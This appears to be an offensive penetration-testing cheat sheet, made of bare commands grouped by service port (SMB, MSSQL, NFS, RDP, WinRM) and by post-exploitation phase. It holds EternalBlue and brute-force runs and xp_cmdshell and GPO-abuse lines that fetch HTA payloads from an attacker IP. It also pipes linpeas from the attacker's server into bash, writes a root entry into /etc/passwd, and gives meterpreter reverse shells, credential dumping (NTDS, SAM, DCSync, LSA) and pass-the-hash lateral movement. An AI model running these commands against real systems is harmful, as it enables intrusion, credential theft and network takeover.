NXCSPIDER=$(nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' -M spider_plus | grep -oP '(?<=Saved share-file metadata to ")[^"]+');cat $NXCSPIDER | grep -vE 'epoch|size' | sed -E 's/[{}\",:]//g' | sed '/^        $/d'
mkdir smb; smbclient //$TARGET/SHARE -N -D . -c 'lcd smb; recurse; prompt; mget *'

smbclient \\\\$TARGET\\SHARENAME -U '$USERNAME'%'$PASSWORD'
impacket-smbclient /'$USERNAME':'$PASSWORD'@$TARGET
get filename.txt

nxc smb $TARGET -u '$USERNAME' -p '$PASSWORD' --ntds --user Administrator
nxc smb $TARGET --use-kcache --ntds --user Administrator

msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set RHOSTS $TARGET; set SMBUser $USERNAME; set SMBPass $PASSWORD; set BLANK_PASSWORDS true; set CreateSession true; run"
sessions -i 1
shares -i C$
cd programdata
lcd ~/Uploads
upload ~/Uploads/windows/nc.exe
download file.txt

msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $TARGET; run'

[*] (512-514) RSERVICES
hydra rlogin://$TARGET -L usernames -P passwords -t35

echo '+ +' > .rhosts; chmod 600 .rhosts
rlogin $USERNAME@$TARGET

[*] (1433) MSSQL
cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt | cut -d: -f1 | sort -u > /tmp/mssqlusernames
cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt | cut -d: -f2 | sort -u > /tmp/mssqlpasswords

hydra mssql://$TARGET -L /tmp/mssqlusernames -P /tmp/mssqlpasswords -t35

impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET'
impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET' -windows-auth

sqsh -S $TARGET -U sa -P sa -C "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'mshta http://$MYIP:8080/Qp4ne2qq0oOb.hta';"
sqsh -S $TARGET -U '$DOM'\\'$USERNAME' -P '$PASSWORD' -C "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami /all';"

msfconsole -q -x "use auxiliary/admin/mssql/mssql_exec; set RHOSTS $TARGET; set CMD mshta.exe http://$MYIP:8080/nZzLAD.hta; set USERNAME $USERNAME; set PASSWORD $PASSWORD; run;"
sessions -i 1

[*] (2049) NFS
showmount -e $TARGET
for x in $(showmount -e "$TARGET" | awk '{print $1}' | grep -v 'Export' | cut -d '/' -f 2)
    do echo "Mounting: $x"
    sudo mount -t nfs "$TARGET":"/$x" "/mnt" -o nolock
    echo "Copying: $x"
    sudo cp -r /mnt .
    tree -puga "./mnt/$x"
    echo "Unmounting: $x"
    sudo umount --lazy "/mnt"
done

sudo open file.txt
sudo open file.png

sudo adduser -u 1002 mntuser
sudo usermod -u 1003 mntuser
sudo su mntuser
setpriv --reuid=1002 --regid=1002 --clear-groups -- ls -laR


[*] (3306) MySQL
mysql -h "$TARGET" -u root@localhost -e 'show databases;'

[*] (3389) RDP
hydra rdp://$TARGET -L usernames -P passwords -t35

xfreerdp /v:'$TARGET' /d:'$DOM' -sec-nla /tls-seclevel:0 /dynamic-resolution +clipboard +drive:Downloads,"$HOME/Upload/"

xfreerdp /u:'$USERNAME' /p:'$PASSWORD' /v:'$TARGET' /d:'$DOM' -sec-nla /tls-seclevel:0 /dynamic-resolution +clipboard +drive:Downloads,"$HOME/Upload/"

[*] (5985) WINRM
evil-winrm -i "$TARGET" -u '$USERNAME' -p '$PASSWORD'
evil-winrm -i "$TARGET" -u '$USERNAME' -H '$HASH'

# Post-Exploitation 
## Fileserver
mkdir -p ~/Upload/linux; mkdir -p ~/Upload/windows
python3 -m http.server 8888 -d ~/Upload

## Linux
[*] Privilege Escalation
wget -qO- http://$MYIP:8888/linux/linpeas.sh | bash
curl http://$MYIP:8888/linux/linpeas.sh | bash

find / -perm /4000 2>/dev/null | xargs ls -la
sudo -l
netstat -tuln
cat /etc/crontab
ls -la /opt
grep -r -E 'conf' /var/www
cd ~/.ssh; ls -la

ls -la /etc/passwd
nano /etc/passwd
mkpasswd -m descrypt 'password'
piS1wHGBkJ3z2
root:piS1wHGBkJ3z2:0:0:root:/root:/usr/bin/bash
su root
password

find / -name '*secret0*' -readable 2>/dev/null | xargs ls -la
find / -name 'root.txt' -readable -exec echo {} \; -exec cat {} \; 2>/dev/null
cat /etc/passwd | grep -vE 'nologin' | cut -d ':' -f '1'
cat /etc/shadow

su $USERNAME --preserve-environment

[*] Meterpreter
msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; setg RHOSTS $TARGET; setg USERNAME $USERNAME; setg PASSWORD $PASSWORD; setg SESSION 1; setg PAYLOAD linux/x64/meterpreter/bind_tcp; setg PAYLOAD_OVERRIDE linux/x64/meterpreter/bind_tcp; setg PLATFORM_OVERRIDE linux; setg PSH_ARCH_OVERRIDE x64; run; background; use post/multi/manage/shell_to_meterpreter; run'

msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; setg RHOSTS $TARGET; setg USERNAME $USERNAME; setg PASSWORD $PASSWORD; setg SESSION 1; setg PAYLOAD linux/x64/meterpreter/reverse_tcp; setg PAYLOAD_OVERRIDE linux/x64/meterpreter/reverse_tcp; setg PLATFORM_OVERRIDE linux; setg PSH_ARCH_OVERRIDE x64; run; background; use post/multi/manage/shell_to_meterpreter; run;'

[*] File Transfer
scp -r ~/Upload $USERNAME@$TARGET:~

[*] Upgrade TTY
python3 -c 'import pty; pty.spawn("/bin/bash")';
CTRL-Z
stty size;stty raw -echo;fg
export SHELL=bash;
export TERM=xterm-256color;
stty rows <num> columns <num>
reset

## Windows
[*] Privilege Escalation
powershell -c "Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher"
Get-ScheduledTask | Where-Object {($_.Author -notmatch "Microsoft")} | Select-Object TaskName, TaskPath, State, Author
dir C:\inetpub\wwwroot
dir C:\xampp
icacls C:\Windows\System32\Config
whoami /priv
cd C:\users; tree /f

Get-WmiObject -Class Win32_ComputerSystem | Select-Object Domain
Get-ADComputer -Filter * | Select-Object Name
systeminfo | Select-String "Domain"
net view
net group "Domain Computers" /domain
net view /domain
net user /domain

wmic useraccount get name,sid
powershell -c "Set-ExecutionPolicy unrestricted"
services.msc

[*] Meterpreter
load powershell
powershell_execute "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/tools.ps1'); dir C:\programdata\tmp"
powershell_import ~/Upload/windows/PrivescCheck.ps1
powershell_execute "Invoke-PrivescCheck"
run multi/recon/local_exploit_suggester

load kiwi
load exploit
load priv

getuid
getprivs
sysinfo
ps
migrate
powershell_execute "Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher"

arp
run auxiliary/scanner/netbios/nbname RHOSTS=10.10.10.0/24
ifconfig

getsystem
cd \\users

run post/windows/gather/enum_ad_users
run post/windows/gather/enum_ad_computers
run post/windows/gather/enum_domain
run post/windows/gather/enum_domains

run post/windows/gather/smart_hashdump
run post/windows/gather/lsa_secrets
run post/windows/gather/credentials/enum_cred_store
run post/windows/gather/credentials/gpp
run post/windows/gather/enum_unattend
run post/windows/gather/credentials/windows_autologin

hashdump
creds_all
kiwi_cmd "lsadump::dcsync /domain:$DOM /all /csv"

cp /root/Tools/Inf/privilege-escalation-awesome-scripts-suite/metasploit/peass.rb /usr/share/metasploit-framework/modules/post/multi/gather/
reload_all

background
sessions
sessions -i 1
jobs
jobs -k 1

[*] Powerview
Import-Module ./PowerView.ps1

Get-NetDomain
Get-LocalUser

Get-ADuser gpoadm | ForEach-Object {Get-ACL "AD:\$($_.DistinguishedName)" | Select-Object -ExpandProperty Owner}
Set-DomainObjectOwner -Identity gpoadm -OwnerIdentity Amelia.Griffiths
Add-DomainObjectAcl -TargetIdentity gpoadm -PrincipalIdentity Amelia.Griffiths -Rights All
Set-DomainUserPassword -Identity gpoadm -AccountPassword (ConvertTo-SecureString "123qweasdF!" -AsPlainText -Force)

python3 pygpoabuse.py -dc-ip $TARGET $DOM/'gpoadm':'123qweasdF!' -gpo-id '31b2f340-016d-11d2-945f-00c04fb984f9' -command 'mshta http://10.8.5.79:8080/buqT7ygPVm.hta'
gpoupdate /force

Set-DomainObject -Identity $USERNAME -SET @{serviceprincipalname='SET/SET'}; Get-DomainSPNTicket -spn SET/SET

[*] SeBackupPrivilege
robocopy /b \Users\Administrator\Desktop .

[*] SAM
cd c:\programdata; reg save hklm\sam SAM; reg save hklm\system SYSTEM;
download SAM
download SYSTEM
impacket-secretsdump LOCAL -sam SAM -system SYSTEM
echo 'Administrator:500:...................' > hashes
hashcat -m 1000 -a 0 hashes /usr/share/wordlists/rockyou.txt

[*] Rubeus
Rubeus.exe kerberoast
nano hashes; cat hashes | awk '{$1=$1}1' | tr -d '\n' | tee hashes; john hashes -w=/usr/share/wordlists/rockyou.txt --format=krb5tgs
Rubeus.exe asreproast
nano hashes; cat hashes | awk '{$1=$1}1' | tr -d '\n' | tee hashes; john hashes -w=/usr/share/wordlists/rockyou.txt --format=krb5asrep

# Pivoting
## Linux
## Windows
[*] Meterpreter
run post/multi/manage/autoroute
run auxiliary/server/socks_proxy SRVHOST=127.0.0.1 SRVPORT=9050 VERSION=4a
run auxiliary/scanner/netbios/nbname RHOSTS=10.10.10.0/24

route
run post/multi/manage/autoroute ACTION=delete
jobs -v
jobs -k 0

cp /etc/proxychains.conf /etc/proxychains.conf.backup
echo "socks4 127.0.0.1 9050" >> /etc/proxychains.conf ; nano /etc/proxychains.conf

proxychains nmap -Pn -sT -p 21,22,88,445,1433,2049,3306,3389,5985 --open 10.10.10.1,2

portfwd add -l 65001 -r 10.10.10.1 -p 445
portfwd add -l 65002 -r 10.10.10.2 -p 445
portfwd add -l 65020 -r 10.10.10.20 -p 445
portfwd add -l 65200 -r 10.10.10.200 -p 445
portfwd list
portfwd flush

use exploit/windows/smb/psexec
set LHOST 10.10.10.3
set RHOSTS 10.10.10.1-2
set SMBUser Administrator
set SMBPass be77c30f5bb90694f6fd9e48f380c9c3:6aa6bca0dafa60871fa5ecaf2217e05f
run

[*] Manual
arp -a
for /L %i in (1,1,254) do ping -n 1 192.168.1.%i

[*] Pass The Hash
meterpreter> hashdump

DUMP=''
echo "$DUMP" | cut -d ':' -f 1 >> usernames; sort -u usernames | tee usernames
echo "$DUMP" | cut -d ':' -f 3- | sed 's/::.*//' >> hashes; sort -u hashes | tee hashes

proxychains nxc smb 10.129.121.240 -u usernames -H hashes -x 'net user sysadm 123qweasdF!'
proxychains nxc smb 10.10.10.1 10.10.10.2 -u usernames -H hashes --local-auth --continue-on-success | grep '\[+\]'
proxychains nxc smb 10.10.10.2 -u '$USERNAME' -H '$HASH' --local-auth --sam | grep ':[0-9]\+:[a-f0-9]\{32\}:[a-f0-9]\{32\}:::' | awk '{print $NF}'
proxychains nxc smb 10.10.10.2 -u '$USERNAME' -H '$HASH' --local-auth --sam --lsa --dpapi --ntds
proxychains nxc smb 10.10.10.2 -u '$USERNAME' -H '$HASH' --local-auth -M reg-winlogon -M lsassy -M powershell_history

impacket-atexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
impacket-psexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
impacket-wmiexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
impacket-smbexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
